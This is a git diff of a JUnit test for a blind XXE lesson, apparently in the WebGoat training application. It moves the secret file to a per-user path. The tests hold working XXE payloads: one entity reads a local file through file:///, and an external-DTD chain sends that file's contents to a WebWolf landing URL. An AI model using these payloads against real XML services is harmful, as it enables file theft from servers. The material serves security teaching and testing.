@@ -4,7 +4,6 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 import com.github.tomakehurst.wiremock.WireMockServer;
 import com.github.tomakehurst.wiremock.client.WireMock;
 import com.github.tomakehurst.wiremock.verification.LoggedRequest;
-import com.jayway.jsonpath.JsonPath;
 import org.hamcrest.CoreMatchers;
 import org.hamcrest.Matchers;
 import org.junit.jupiter.api.BeforeEach;
@@ -27,14 +26,9 @@ import static org.springframework.test.web.servlet.request.MockMvcRequestBuilder
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
 
-/**
- * @author nbaars
- * @since 5/4/17.
- */
 class BlindSendFileAssignmentTest extends LessonTest {
 
     private int port;
-
     private WireMockServer webwolfServer;
 
     @BeforeEach
@@ -82,7 +76,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
 
     @Test
     public void simpleXXEShouldNotWork() throws Exception {
-        File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
+        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
         String content = "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///%s\"> ]><comment><text>&root;</text></comment>";
         mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                         .content(String.format(content, targetFile.toString())))
@@ -92,7 +86,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
 
     @Test
     public void solve() throws Exception {
-        File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
+        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
         //Host DTD on WebWolf site
         String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                 "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
@@ -116,7 +110,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
 
     @Test
     public void solveOnlyParamReferenceEntityInExternalDTD() throws Exception {
-        File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
+        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
         //Host DTD on WebWolf site
         String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                 "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/landing?text=%file;'>\">\n";
@@ -129,7 +123,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
         //Make the request from WebGoat
         String xml = "<?xml version=\"1.0\"?>" +
                 "<!DOCTYPE comment [" +
-                "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
+                "<!ENTITY % file SYSTEM \"" + targetFile.toURI() + "\">\n" +
                 "<!ENTITY % remote SYSTEM \"http://localhost:" + port + "/files/test.dtd\">" +
                 "%remote;" +
                 "%all;" +
